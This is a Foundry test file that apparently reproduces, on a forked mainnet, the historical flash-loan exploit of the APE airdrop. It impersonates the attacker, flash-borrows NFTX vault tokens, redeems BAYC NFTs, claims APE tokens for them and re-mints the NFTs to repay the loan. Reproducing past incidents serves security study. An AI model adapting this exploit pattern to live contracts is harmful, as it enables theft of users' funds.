// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

/*
Exploited tx: https://etherscan.io/tx/0xeb8c3bebed11e2e4fcd30cbfc2fb3c55c4ca166003c7f7d319e78eaab9747098
Debug:
https://dashboard.tenderly.co/tx/mainnet/0xeb8c3bebed11e2e4fcd30cbfc2fb3c55c4ca166003c7f7d319e78eaab9747098
https://tools.blocksec.com/tx/eth/0xeb8c3bebed11e2e4fcd30cbfc2fb3c55c4ca166003c7f7d319e78eaab9747098*/

contract ContractTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    IBAYCi bayc = IBAYCi(0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D);
    INFTXVault NFTXVault = INFTXVault(0xEA47B64e1BFCCb773A0420247C0aa0a3C1D2E5C5);
    IAirdrop AirdropGrapesToken = IAirdrop(0x025C6da5BD0e6A5dd1350fda9e3B6a614B205a1F);
    IERC20 ape = IERC20(0x4d224452801ACEd8B2F0aebE155379bb5D594381);
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    function setUp() public {
        cheats.createSelectFork("mainnet", 14_403_948); // fork mainnet at block 14403948
    }

    function test() public {
        cheats.startPrank(0x6703741e913a30D6604481472b6d81F3da45e6E8);
        bayc.transferFrom(0x6703741e913a30D6604481472b6d81F3da45e6E8, address(this), 1060);
        emit log_named_decimal_uint("Before exploiting, Attacker balance of APE is", ape.balanceOf(address(this)), 18);
        NFTXVault.approve(address(NFTXVault), type(uint256).max);
        NFTXVault.flashLoan(address(this), address(NFTXVault), 5_200_000_000_000_000_000, ""); // flash loan 5.2 BAYC tokens from the NFTX Vault
        emit log_named_decimal_uint("After exploiting, Attacker balance of APE is", ape.balanceOf(address(this)), 18);
    }

    function onFlashLoan(address, address, uint256, uint256, bytes memory) external returns (bytes32) {
        uint256[] memory blank = new uint256[](0);
        // The attacker used the borrowed BAYC tokens to redeem the following BAYC NFTs
        NFTXVault.redeem(5, blank);

        //Owning so many BAYC NFTs allowed the attacker to claim APE tokens for each, resulting in a total amount of 60,564 APE.
        AirdropGrapesToken.claimTokens();

        bayc.setApprovalForAll(address(NFTXVault), true);

        uint256[] memory nfts = new uint256[](6);
        nfts[0] = 7594;
        nfts[1] = 4755;
        nfts[2] = 9915;
        nfts[3] = 8214;
        nfts[4] = 8167;
        nfts[5] = 1060;

        NFTXVault.mint(nfts, blank);

        NFTXVault.approve(address(NFTXVault), type(uint256).max);

        return CALLBACK_SUCCESS;
    }

    function onERC721Received(
        address _operator,
        address _from,
        uint256 _tokenId,
        bytes calldata _data
    ) external returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
